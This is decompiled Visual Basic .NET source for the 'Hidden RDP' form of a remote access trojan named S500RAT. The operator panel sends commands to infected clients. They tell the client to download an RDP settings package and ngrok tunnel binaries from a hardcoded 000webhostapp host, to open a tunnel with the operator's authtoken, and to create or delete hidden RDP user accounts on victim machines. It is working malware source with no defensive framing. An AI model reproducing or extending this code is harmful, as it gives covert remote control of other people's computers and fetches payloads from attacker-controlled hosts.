Imports System
Imports System.ComponentModel
Imports System.Diagnostics
Imports System.Drawing
Imports System.Drawing.Drawing2D
Imports System.Runtime.CompilerServices
Imports System.Threading
Imports System.Windows.Forms
Imports Guna.UI2.WinForms
Imports Guna.UI2.WinForms.Enums
Imports MessagePackLib.MessagePack
Imports Microsoft.VisualBasic
Imports Microsoft.VisualBasic.CompilerServices
Imports S500RAT.My
Imports S500RAT.Server
Imports S500RAT.Server.Connection
Imports Sunny.UI

Namespace S500RAT
	' Token: 0x0200001E RID: 30
	<DesignerGenerated()>
	Public Partial Class FormHRDP
		Inherits Form

		' Token: 0x060004BA RID: 1210 RVA: 0x00028E9C File Offset: 0x0002709C
		Public Sub New()
			AddHandler MyBase.Load, AddressOf Me.FormHRDP_Load
			AddHandler MyBase.Resize, AddressOf Me.FormFun_Resize
			Me.FormSize = False
			Me.URLRDP = "https://softwares500.000webhostapp.com/SettingsRDP.zip"
			Me.URLNgrok64 = "https://softwares500.000webhostapp.com/ngrok64.zip"
			Me.URLNgrok32 = "https://softwares500.000webhostapp.com/ngrok32.zip"
			Me.InitializeComponent()
		End Sub

		' Token: 0x170001EC RID: 492
		' (get) Token: 0x060004BD RID: 1213 RVA: 0x0002B556 File Offset: 0x00029756
		' (set) Token: 0x060004BE RID: 1214 RVA: 0x0002B560 File Offset: 0x00029760
		Friend Overridable Property Timer1 As System.Windows.Forms.Timer
			<CompilerGenerated()>
			Get
				Return Me._Timer1
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As System.Windows.Forms.Timer)
				Dim value2 As EventHandler = AddressOf Me.Timer1_Tick
				Dim timer As System.Windows.Forms.Timer = Me._Timer1
				If timer IsNot Nothing Then
					RemoveHandler timer.Tick, value2
				End If
				Me._Timer1 = value
				timer = Me._Timer1
				If timer IsNot Nothing Then
					AddHandler timer.Tick, value2
				End If
			End Set
		End Property

		' Token: 0x170001ED RID: 493
		' (get) Token: 0x060004BF RID: 1215 RVA: 0x0002B5A3 File Offset: 0x000297A3
		' (set) Token: 0x060004C0 RID: 1216 RVA: 0x0002B5B0 File Offset: 0x000297B0
		Friend Overridable Property RemoveRDP As Guna2GradientButton
			<CompilerGenerated()>
			Get
				Return Me._RemoveRDP
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Guna2GradientButton)
				Dim value2 As EventHandler = AddressOf Me.RemoveRDP_Click
				Dim removeRDP As Guna2GradientButton = Me._RemoveRDP
				If removeRDP IsNot Nothing Then
					RemoveHandler removeRDP.Click, value2
				End If
				Me._RemoveRDP = value
				removeRDP = Me._RemoveRDP
				If removeRDP IsNot Nothing Then
					AddHandler removeRDP.Click, value2
				End If
			End Set
		End Property

		' Token: 0x170001EE RID: 494
		' (get) Token: 0x060004C1 RID: 1217 RVA: 0x0002B5F3 File Offset: 0x000297F3
		' (set) Token: 0x060004C2 RID: 1218 RVA: 0x0002B600 File Offset: 0x00029800
		Friend Overridable Property CreateRDP As Guna2GradientButton
			<CompilerGenerated()>
			Get
				Return Me._CreateRDP
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Guna2GradientButton)
				Dim value2 As EventHandler = AddressOf Me.CreateRDP_Click
				Dim createRDP As Guna2GradientButton = Me._CreateRDP
				If createRDP IsNot Nothing Then
					RemoveHandler createRDP.Click, value2
				End If
				Me._CreateRDP = value
				createRDP = Me._CreateRDP
				If createRDP IsNot Nothing Then
					AddHandler createRDP.Click, value2
				End If
			End Set
		End Property

		' Token: 0x170001EF RID: 495
		' (get) Token: 0x060004C3 RID: 1219 RVA: 0x0002B643 File Offset: 0x00029843
		' (set) Token: 0x060004C4 RID: 1220 RVA: 0x0002B64D File Offset: 0x0002984D
		Friend Overridable Property UiLabel1 As UILabel

		' Token: 0x170001F0 RID: 496
		' (get) Token: 0x060004C5 RID: 1221 RVA: 0x0002B656 File Offset: 0x00029856
		' (set) Token: 0x060004C6 RID: 1222 RVA: 0x0002B660 File Offset: 0x00029860
		Private Overridable Property ClientInfo As Label

		' Token: 0x170001F1 RID: 497
		' (get) Token: 0x060004C7 RID: 1223 RVA: 0x0002B669 File Offset: 0x00029869
		' (set) Token: 0x060004C8 RID: 1224 RVA: 0x0002B673 File Offset: 0x00029873
		Friend Overridable Property GroupBox2 As Guna2GroupBox

		' Token: 0x170001F2 RID: 498
		' (get) Token: 0x060004C9 RID: 1225 RVA: 0x0002B67C File Offset: 0x0002987C
		' (set) Token: 0x060004CA RID: 1226 RVA: 0x0002B686 File Offset: 0x00029886
		Friend Overridable Property PictureBox17 As PictureBox

		' Token: 0x170001F3 RID: 499
		' (get) Token: 0x060004CB RID: 1227 RVA: 0x0002B68F File Offset: 0x0002988F
		' (set) Token: 0x060004CC RID: 1228 RVA: 0x0002B699 File Offset: 0x00029899
		Friend Overridable Property Label6 As Label

		' Token: 0x170001F4 RID: 500
		' (get) Token: 0x060004CD RID: 1229 RVA: 0x0002B6A2 File Offset: 0x000298A2
		' (set) Token: 0x060004CE RID: 1230 RVA: 0x0002B6AC File Offset: 0x000298AC
		Friend Overridable Property PasswordHRDP As Guna2TextBox

		' Token: 0x170001F5 RID: 501
		' (get) Token: 0x060004CF RID: 1231 RVA: 0x0002B6B5 File Offset: 0x000298B5
		' (set) Token: 0x060004D0 RID: 1232 RVA: 0x0002B6BF File Offset: 0x000298BF
		Friend Overridable Property HostNgrok As Guna2TextBox

		' Token: 0x170001F6 RID: 502
		' (get) Token: 0x060004D1 RID: 1233 RVA: 0x0002B6C8 File Offset: 0x000298C8
		' (set) Token: 0x060004D2 RID: 1234 RVA: 0x0002B6D2 File Offset: 0x000298D2
		Friend Overridable Property ListHRDP As DataGridView

		' Token: 0x170001F7 RID: 503
		' (get) Token: 0x060004D3 RID: 1235 RVA: 0x0002B6DB File Offset: 0x000298DB
		' (set) Token: 0x060004D4 RID: 1236 RVA: 0x0002B6E8 File Offset: 0x000298E8
		Friend Overridable Property UsernameRDP As Guna2TextBox
			<CompilerGenerated()>
			Get
				Return Me._UsernameRDP
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Guna2TextBox)
				Dim value2 As KeyPressEventHandler = AddressOf Me.UsernameRDP_KeyPress
				Dim usernameRDP As Guna2TextBox = Me._UsernameRDP
				If usernameRDP IsNot Nothing Then
					RemoveHandler usernameRDP.KeyPress, value2
				End If
				Me._UsernameRDP = value
				usernameRDP = Me._UsernameRDP
				If usernameRDP IsNot Nothing Then
					AddHandler usernameRDP.KeyPress, value2
				End If
			End Set
		End Property

		' Token: 0x170001F8 RID: 504
		' (get) Token: 0x060004D5 RID: 1237 RVA: 0x0002B72B File Offset: 0x0002992B
		' (set) Token: 0x060004D6 RID: 1238 RVA: 0x0002B738 File Offset: 0x00029938
		Friend Overridable Property InstallAndUnstalRDP As Guna2GradientButton
			<CompilerGenerated()>
			Get
				Return Me._InstallAndUnstalRDP
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Guna2GradientButton)
				Dim value2 As EventHandler = AddressOf Me.InstallAndUnstalRDP_Click
				Dim installAndUnstalRDP As Guna2GradientButton = Me._InstallAndUnstalRDP
				If installAndUnstalRDP IsNot Nothing Then
					RemoveHandler installAndUnstalRDP.Click, value2
				End If
				Me._InstallAndUnstalRDP = value
				installAndUnstalRDP = Me._InstallAndUnstalRDP
				If installAndUnstalRDP IsNot Nothing Then
					AddHandler installAndUnstalRDP.Click, value2
				End If
			End Set
		End Property

		' Token: 0x170001F9 RID: 505
		' (get) Token: 0x060004D7 RID: 1239 RVA: 0x0002B77B File Offset: 0x0002997B
		' (set) Token: 0x060004D8 RID: 1240 RVA: 0x0002B788 File Offset: 0x00029988
		Friend Overridable Property ConnectNgrok As Guna2GradientButton
			<CompilerGenerated()>
			Get
				Return Me._ConnectNgrok
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Guna2GradientButton)
				Dim value2 As EventHandler = AddressOf Me.ConnectNgrok_Click
				Dim connectNgrok As Guna2GradientButton = Me._ConnectNgrok
				If connectNgrok IsNot Nothing Then
					RemoveHandler connectNgrok.Click, value2
				End If
				Me._ConnectNgrok = value
				connectNgrok = Me._ConnectNgrok
				If connectNgrok IsNot Nothing Then
					AddHandler connectNgrok.Click, value2
				End If
			End Set
		End Property

		' Token: 0x170001FA RID: 506
		' (get) Token: 0x060004D9 RID: 1241 RVA: 0x0002B7CB File Offset: 0x000299CB
		' (set) Token: 0x060004DA RID: 1242 RVA: 0x0002B7D5 File Offset: 0x000299D5
		Friend Overridable Property Column22 As DataGridViewTextBoxColumn

		' Token: 0x170001FB RID: 507
		' (get) Token: 0x060004DB RID: 1243 RVA: 0x0002B7DE File Offset: 0x000299DE
		' (set) Token: 0x060004DC RID: 1244 RVA: 0x0002B7E8 File Offset: 0x000299E8
		Friend Overridable Property Column23 As DataGridViewTextBoxColumn

		' Token: 0x170001FC RID: 508
		' (get) Token: 0x060004DD RID: 1245 RVA: 0x0002B7F1 File Offset: 0x000299F1
		' (set) Token: 0x060004DE RID: 1246 RVA: 0x0002B7FB File Offset: 0x000299FB
		Friend Overridable Property StateNagrok As Label

		' Token: 0x170001FD RID: 509
		' (get) Token: 0x060004DF RID: 1247 RVA: 0x0002B804 File Offset: 0x00029A04
		' (set) Token: 0x060004E0 RID: 1248 RVA: 0x0002B80E File Offset: 0x00029A0E
		Friend Overridable Property YourAuthtoken As Guna2TextBox

		' Token: 0x170001FE RID: 510
		' (get) Token: 0x060004E1 RID: 1249 RVA: 0x0002B817 File Offset: 0x00029A17
		' (set) Token: 0x060004E2 RID: 1250 RVA: 0x0002B821 File Offset: 0x00029A21
		Friend Overridable Property GroupBox1 As Guna2GroupBox

		' Token: 0x170001FF RID: 511
		' (get) Token: 0x060004E3 RID: 1251 RVA: 0x0002B82A File Offset: 0x00029A2A
		' (set) Token: 0x060004E4 RID: 1252 RVA: 0x0002B834 File Offset: 0x00029A34
		Friend Overridable Property StateInstalRDP As Label

		' Token: 0x17000200 RID: 512
		' (get) Token: 0x060004E5 RID: 1253 RVA: 0x0002B83D File Offset: 0x00029A3D
		' (set) Token: 0x060004E6 RID: 1254 RVA: 0x0002B847 File Offset: 0x00029A47
		Friend Overridable Property PictureBox1 As PictureBox

		' Token: 0x17000201 RID: 513
		' (get) Token: 0x060004E7 RID: 1255 RVA: 0x0002B850 File Offset: 0x00029A50
		' (set) Token: 0x060004E8 RID: 1256 RVA: 0x0002B85A File Offset: 0x00029A5A
		Friend Overridable Property Label3 As Label

		' Token: 0x17000202 RID: 514
		' (get) Token: 0x060004E9 RID: 1257 RVA: 0x0002B863 File Offset: 0x00029A63
		' (set) Token: 0x060004EA RID: 1258 RVA: 0x0002B86D File Offset: 0x00029A6D
		Private Overridable Property Label4 As Label

		' Token: 0x17000203 RID: 515
		' (get) Token: 0x060004EB RID: 1259 RVA: 0x0002B876 File Offset: 0x00029A76
		' (set) Token: 0x060004EC RID: 1260 RVA: 0x0002B880 File Offset: 0x00029A80
		Public Overridable Property StateHRDP As Label
			<CompilerGenerated()>
			Get
				Return Me._StateHRDP
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Label)
				Dim value2 As EventHandler = AddressOf Me.StateHRDP_Click
				Dim stateHRDP As Label = Me._StateHRDP
				If stateHRDP IsNot Nothing Then
					RemoveHandler stateHRDP.Click, value2
				End If
				Me._StateHRDP = value
				stateHRDP = Me._StateHRDP
				If stateHRDP IsNot Nothing Then
					AddHandler stateHRDP.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000204 RID: 516
		' (get) Token: 0x060004ED RID: 1261 RVA: 0x0002B8C3 File Offset: 0x00029AC3
		' (set) Token: 0x060004EE RID: 1262 RVA: 0x0002B8CD File Offset: 0x00029ACD
		Friend Overridable Property Guna2ResizeBox2 As Guna2ResizeBox

		' Token: 0x17000205 RID: 517
		' (get) Token: 0x060004EF RID: 1263 RVA: 0x0002B8D6 File Offset: 0x00029AD6
		' (set) Token: 0x060004F0 RID: 1264 RVA: 0x0002B8E0 File Offset: 0x00029AE0
		Friend Overridable Property ControllContextMenuStrip As ContextMenuStrip

		' Token: 0x17000206 RID: 518
		' (get) Token: 0x060004F1 RID: 1265 RVA: 0x0002B8E9 File Offset: 0x00029AE9
		' (set) Token: 0x060004F2 RID: 1266 RVA: 0x0002B8F4 File Offset: 0x00029AF4
		Friend Overridable Property KillProcess As ToolStripMenuItem
			<CompilerGenerated()>
			Get
				Return Me._KillProcess
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.KillProcess_Click
				Dim killProcess As ToolStripMenuItem = Me._KillProcess
				If killProcess IsNot Nothing Then
					RemoveHandler killProcess.Click, value2
				End If
				Me._KillProcess = value
				killProcess = Me._KillProcess
				If killProcess IsNot Nothing Then
					AddHandler killProcess.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000207 RID: 519
		' (get) Token: 0x060004F3 RID: 1267 RVA: 0x0002B937 File Offset: 0x00029B37
		' (set) Token: 0x060004F4 RID: 1268 RVA: 0x0002B944 File Offset: 0x00029B44
		Friend Overridable Property RefreshList As ToolStripMenuItem
			<CompilerGenerated()>
			Get
				Return Me._RefreshList
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.RefreshList_Click
				Dim refreshList As ToolStripMenuItem = Me._RefreshList
				If refreshList IsNot Nothing Then
					RemoveHandler refreshList.Click, value2
				End If
				Me._RefreshList = value
				refreshList = Me._RefreshList
				If refreshList IsNot Nothing Then
					AddHandler refreshList.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000208 RID: 520
		' (get) Token: 0x060004F5 RID: 1269 RVA: 0x0002B987 File Offset: 0x00029B87
		' (set) Token: 0x060004F6 RID: 1270 RVA: 0x0002B994 File Offset: 0x00029B94
		Friend Overridable Property RestartProcess As ToolStripMenuItem
			<CompilerGenerated()>
			Get
				Return Me._RestartProcess
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.RestartProcess_Click
				Dim restartProcess As ToolStripMenuItem = Me._RestartProcess
				If restartProcess IsNot Nothing Then
					RemoveHandler restartProcess.Click, value2
				End If
				Me._RestartProcess = value
				restartProcess = Me._RestartProcess
				If restartProcess IsNot Nothing Then
					AddHandler restartProcess.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000209 RID: 521
		' (get) Token: 0x060004F7 RID: 1271 RVA: 0x0002B9D7 File Offset: 0x00029BD7
		' (set) Token: 0x060004F8 RID: 1272 RVA: 0x0002B9E1 File Offset: 0x00029BE1
		Friend Overridable Property Mini As ValleyMini

		' Token: 0x1700020A RID: 522
		' (get) Token: 0x060004F9 RID: 1273 RVA: 0x0002B9EA File Offset: 0x00029BEA
		' (set) Token: 0x060004FA RID: 1274 RVA: 0x0002B9F4 File Offset: 0x00029BF4
		Friend Overridable Property ExitForm As ValleyClose
			<CompilerGenerated()>
			Get
				Return Me._ExitForm
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ValleyClose)
				Dim value2 As EventHandler = AddressOf Me.ExitForm_Click
				Dim exitForm As ValleyClose = Me._ExitForm
				If exitForm IsNot Nothing Then
					RemoveHandler exitForm.Click, value2
				End If
				Me._ExitForm = value
				exitForm = Me._ExitForm
				If exitForm IsNot Nothing Then
					AddHandler exitForm.Click, value2
				End If
			End Set
		End Property

		' Token: 0x1700020B RID: 523
		' (get) Token: 0x060004FB RID: 1275 RVA: 0x0002BA37 File Offset: 0x00029C37
		' (set) Token: 0x060004FC RID: 1276 RVA: 0x0002BA41 File Offset: 0x00029C41
		Friend Overridable Property Guna2BorderlessForm1 As Guna2BorderlessForm

		' Token: 0x1700020C RID: 524
		' (get) Token: 0x060004FD RID: 1277 RVA: 0x0002BA4A File Offset: 0x00029C4A
		' (set) Token: 0x060004FE RID: 1278 RVA: 0x0002BA54 File Offset: 0x00029C54
		Friend Overridable Property Guna2DragControl1 As Guna2DragControl

		' Token: 0x1700020D RID: 525
		' (get) Token: 0x060004FF RID: 1279 RVA: 0x0002BA5D File Offset: 0x00029C5D
		' (set) Token: 0x06000500 RID: 1280 RVA: 0x0002BA67 File Offset: 0x00029C67
		Public Property Client As Clients

		' Token: 0x1700020E RID: 526
		' (get) Token: 0x06000501 RID: 1281 RVA: 0x0002BA70 File Offset: 0x00029C70
		' (set) Token: 0x06000502 RID: 1282 RVA: 0x0002BA7A File Offset: 0x00029C7A
		Public Property F As FormS500

		' Token: 0x1700020F RID: 527
		' (get) Token: 0x06000503 RID: 1283 RVA: 0x0002BA83 File Offset: 0x00029C83
		' (set) Token: 0x06000504 RID: 1284 RVA: 0x0002BA8D File Offset: 0x00029C8D
		Public Property FullPath As String

		' Token: 0x17000210 RID: 528
		' (get) Token: 0x06000505 RID: 1285 RVA: 0x0002BA96 File Offset: 0x00029C96
		' (set) Token: 0x06000506 RID: 1286 RVA: 0x0002BAA0 File Offset: 0x00029CA0
		Friend Property ParentClient As Clients

		' Token: 0x06000507 RID: 1287 RVA: 0x0002BAAC File Offset: 0x00029CAC
		Private Sub FormHRDP_Load(sender As Object, e As EventArgs)
			Try
				Dim flag As Boolean = Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(APIH.GetHWID(Conversions.ToString(FormSC.GetPicpass())), FormSC.GetPickey(), False)))
				If flag Then
					MyBase.Close()
				End If
				Dim flag2 As Boolean = Operators.ConditionalCompareObjectEqual(APIH.GetHWID(Conversions.ToString(FormSC.GetPicpass())), FormSC.GetPickey(), False)
				If flag2 Then
					Setting.Running = True
				Else
					MyBase.Close()
				End If
				Dim flag3 As Boolean = Not Setting.Running
				If flag3 Then
					MyBase.Close()
				End If
			Catch ex As Exception
				MyBase.Close()
			End Try
			Dim expression As String = Conversions.ToString(RuntimeHelpers.GetObjectValue(DataB.InfoClient(Me.ParentClient.L)))
			Try
				Me.ClientInfo.Text = String.Concat(New String() { Strings.Split(expression, "|'|", -1, CompareMethod.Binary)(1), " / ", Strings.Split(expression, "|'|", -1, CompareMethod.Binary)(2), " / ", Strings.Split(expression, "|'|", -1, CompareMethod.Binary)(3), " / ", Strings.Split(expression, "|'|", -1, CompareMethod.Binary)(4) })
			Catch ex2 As Exception
				Me.ClientInfo.Text = "Not found !"
			End Try
			Me.FormSize = True
			Me.MinimumSize = MyBase.Size
			Me.MaximumSize = MyBase.Size
		End Sub

		' Token: 0x06000508 RID: 1288 RVA: 0x0002BC38 File Offset: 0x00029E38
		Private Sub FormFun_Resize(sender As Object, e As EventArgs)
			Dim flag As Boolean = Not Me.FormSize
			If flag Then
				Dim width As Integer = Screen.PrimaryScreen.Bounds.Width
				Dim height As Integer = Screen.PrimaryScreen.Bounds.Height
				Dim width2 As Integer = MyBase.Width
				Dim height2 As Integer = MyBase.Height
				Dim x As Integer = CInt(Math.Round(CDbl((width - width2)) / 2.0))
				Dim y As Integer = CInt(Math.Round(CDbl((height - height2)) / 2.0))
				MyBase.Location = New Point(x, y)
			End If
		End Sub

		' Token: 0x06000509 RID: 1289 RVA: 0x0002BCCC File Offset: 0x00029ECC
		Private Sub Timer1_Tick(sender As Object, e As EventArgs)
			Try
				Dim flag As Boolean = Not Me.ParentClient.TcpClient.Connected OrElse Not Me.Client.TcpClient.Connected
				If flag Then
					MyBase.Close()
				End If
			Catch ex As Exception
				MyBase.Close()
			End Try
		End Sub

		' Token: 0x0600050A RID: 1290 RVA: 0x0002BD38 File Offset: 0x00029F38
		Private Sub Cansel_Click(sender As Object, e As EventArgs)
			ThreadPool.QueueUserWorkItem(Sub(o As Object)
				Dim client As Clients = Me.Client
				If client IsNot Nothing Then
					client.Disconnected()
				End If
			End Sub)
		End Sub

		' Token: 0x0600050B RID: 1291 RVA: 0x0002BD50 File Offset: 0x00029F50
		Private Sub InstallAndUnstalRDP_Click(sender As Object, e As EventArgs)
			Dim flag As Boolean = Operators.CompareString(Me.InstallAndUnstalRDP.Text, "Install", False) = 0
			If flag Then
				Try
					Dim msgPack As MsgPack = New MsgPack()
					msgPack.ForcePathObject("Packet").AsString = "Install"
					msgPack.ForcePathObject("URLRDP").AsString = Me.URLRDP
					ThreadPool.QueueUserWorkItem(AddressOf Me.Client.SendByte, msgPack.Encode2Bytes())
					Me.InstallAndUnstalRDP.Enabled = False
					Me.InstallAndUnstalRDP.Text = "Install..."
				Catch ex As Exception
				End Try
			Else
				Try
					Dim msgPack2 As MsgPack = New MsgPack()
					msgPack2.ForcePathObject("Packet").AsString = "Uninstall"
					msgPack2.ForcePathObject("URLRDP").AsString = Me.URLRDP
					ThreadPool.QueueUserWorkItem(AddressOf Me.Client.SendByte, msgPack2.Encode2Bytes())
					Me.InstallAndUnstalRDP.Enabled = False
					Me.InstallAndUnstalRDP.Enabled = False
					Me.InstallAndUnstalRDP.Text = "Uninstall..."
				Catch ex2 As Exception
				End Try
			End If
		End Sub

		' Token: 0x0600050C RID: 1292 RVA: 0x0002BEB0 File Offset: 0x0002A0B0
		Private Sub ConnectNgrok_Click(sender As Object, e As EventArgs)
			Dim flag As Boolean = Operators.CompareString(Me.ConnectNgrok.Text, "Connect", False) = 0
			If flag Then
				Dim flag2 As Boolean = Operators.CompareString(Me.YourAuthtoken.Text, Nothing, False) = 0
				If flag2 Then
					MessageBox.Show("Please enter Your Authtoken", "Hidden RDP!", MessageBoxButtons.OK, MessageBoxIcon.Exclamation, MessageBoxDefaultButton.Button1)
				Else
					Try
						Dim msgPack As MsgPack = New MsgPack()
						msgPack.ForcePathObject("Packet").AsString = "Connect"
						msgPack.ForcePathObject("URLngrok64").AsString = Me.URLNgrok64
						msgPack.ForcePathObject("URLngrok32").AsString = Me.URLNgrok32
						msgPack.ForcePathObject("Token").AsString = Me.YourAuthtoken.Text
						ThreadPool.QueueUserWorkItem(AddressOf Me.Client.SendByte, msgPack.Encode2Bytes())
						Me.ConnectNgrok.Enabled = False
						Me.ConnectNgrok.Text = "Contacting..."
					Catch ex As Exception
					End Try
				End If
			Else
				Try
					Dim msgPack2 As MsgPack = New MsgPack()
					msgPack2.ForcePathObject("Packet").AsString = "Disconnect"
					ThreadPool.QueueUserWorkItem(AddressOf Me.Client.SendByte, msgPack2.Encode2Bytes())
					Me.ConnectNgrok.Enabled = False
					Me.ConnectNgrok.Text = "Disconnect..."
				Catch ex2 As Exception
				End Try
			End If
		End Sub

		' Token: 0x0600050D RID: 1293 RVA: 0x0002C04C File Offset: 0x0002A24C
		Private Sub CreateRDP_Click(sender As Object, e As EventArgs)
			Dim flag As Boolean = Operators.CompareString(Me.UsernameRDP.Text, Nothing, False) = 0
			If flag Then
				MessageBox.Show("Please enter your username", "Hidden RDP!!", MessageBoxButtons.OK, MessageBoxIcon.Exclamation, MessageBoxDefaultButton.Button1)
			Else
				Dim flag2 As Boolean = Operators.CompareString(Me.PasswordHRDP.Text, Nothing, False) = 0
				If flag2 Then
					MessageBox.Show("Please enter your password", "Hidden RDP!!", MessageBoxButtons.OK, MessageBoxIcon.Exclamation, MessageBoxDefaultButton.Button1)
				Else
					Try
						Dim msgPack As MsgPack = New MsgPack()
						msgPack.ForcePathObject("Packet").AsString = "CreateUser"
						msgPack.ForcePathObject("User").AsString = Me.UsernameRDP.Text
						msgPack.ForcePathObject("Pass").AsString = Me.PasswordHRDP.Text
						ThreadPool.QueueUserWorkItem(AddressOf Me.Client.SendByte, msgPack.Encode2Bytes())
						Me.CreateRDP.Enabled = False
						Me.CreateRDP.Text = "Create..."
					Catch ex As Exception
					End Try
				End If
			End If
		End Sub

		' Token: 0x0600050E RID: 1294 RVA: 0x0002C170 File Offset: 0x0002A370
		Private Sub UsernameRDP_KeyPress(sender As Object, e As KeyPressEventArgs)
			e.Handled = ((e.KeyChar = "\"c OrElse Functions.CheckPathChard(e.KeyChar.ToString())) AndAlso Not Char.IsControl(e.KeyChar))
		End Sub

		' Token: 0x0600050F RID: 1295 RVA: 0x0002C1B8 File Offset: 0x0002A3B8
		Private Sub RemoveRDP_Click(sender As Object, e As EventArgs)
			Me.RemoveRDP.Enabled = False
			Dim flag As Boolean = Me.ListHRDP.Rows.Count > 0
			If flag Then
				Try
					For Each obj As Object In Me.ListHRDP.SelectedRows
						Dim dataGridViewRow As DataGridViewRow = CType(obj, DataGridViewRow)
						Dim msgPack As MsgPack = New MsgPack()
						msgPack.ForcePathObject("Packet").AsString = "DeleteUser"
						msgPack.ForcePathObject("User").AsString = dataGridViewRow.Cells(0).Value.ToString()
						ThreadPool.QueueUserWorkItem(AddressOf Me.Client.SendByte, msgPack.Encode2Bytes())
					Next
				Catch ex As Exception
					Console.WriteLine(ex.Message)
				End Try
			End If
		End Sub

		' Token: 0x06000510 RID: 1296 RVA: 0x0002C2B0 File Offset: 0x0002A4B0
		Private Sub KillProcess_Click(sender As Object, e As EventArgs)
			Try
				Dim msgPack As MsgPack = New MsgPack()
				msgPack.ForcePathObject("Packet").AsString = "Refresh"
				ThreadPool.QueueUserWorkItem(AddressOf Me.Client.SendByte, msgPack.Encode2Bytes())
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x06000511 RID: 1297 RVA: 0x0002C318 File Offset: 0x0002A518
		Private Sub RefreshList_Click(sender As Object, e As EventArgs)
			Dim flag As Boolean = Me.ListHRDP.Rows.Count > 0
			If flag Then
				Try
					For Each obj As Object In Me.ListHRDP.SelectedRows
						Dim dataGridViewRow As DataGridViewRow = CType(obj, DataGridViewRow)
						MyProject.Computer.Clipboard.SetText(dataGridViewRow.Cells(0).Value.ToString())
						Me.StateHRDP.Text = "Username copied successfully"
					Next
				Catch ex As Exception
					Console.WriteLine(ex.Message)
				End Try
			End If
		End Sub

		' Token: 0x06000512 RID: 1298 RVA: 0x0002C3D8 File Offset: 0x0002A5D8
		Private Sub StateHRDP_Click(sender As Object, e As EventArgs)
			Me.StateHRDP.ForeColor = Color.White
			Me.StateHRDP.Text = "..."
		End Sub

		' Token: 0x06000513 RID: 1299 RVA: 0x0002C400 File Offset: 0x0002A600
		Private Sub RestartProcess_Click(sender As Object, e As EventArgs)
			Dim flag As Boolean = Me.ListHRDP.Rows.Count > 0
			If flag Then
				Try
					For Each obj As Object In Me.ListHRDP.SelectedRows
						Dim dataGridViewRow As DataGridViewRow = CType(obj, DataGridViewRow)
						MyProject.Computer.Clipboard.SetText(dataGridViewRow.Cells(0).Value.ToString())
						Me.StateHRDP.Text = "Password copied successfully"
					Next
				Catch ex As Exception
					Console.WriteLine(ex.Message)
				End Try
			End If
		End Sub

		' Token: 0x06000514 RID: 1300 RVA: 0x0002C4C0 File Offset: 0x0002A6C0
		Private Sub ExitForm_Click(sender As Object, e As EventArgs)
			MyBase.Close()
		End Sub

		' Token: 0x04000247 RID: 583
		Private FormSize As Boolean

		' Token: 0x04000248 RID: 584
		Private URLRDP As String

		' Token: 0x04000249 RID: 585
		Private URLNgrok64 As String

		' Token: 0x0400024A RID: 586
		Private URLNgrok32 As String
	End Class
End Namespace
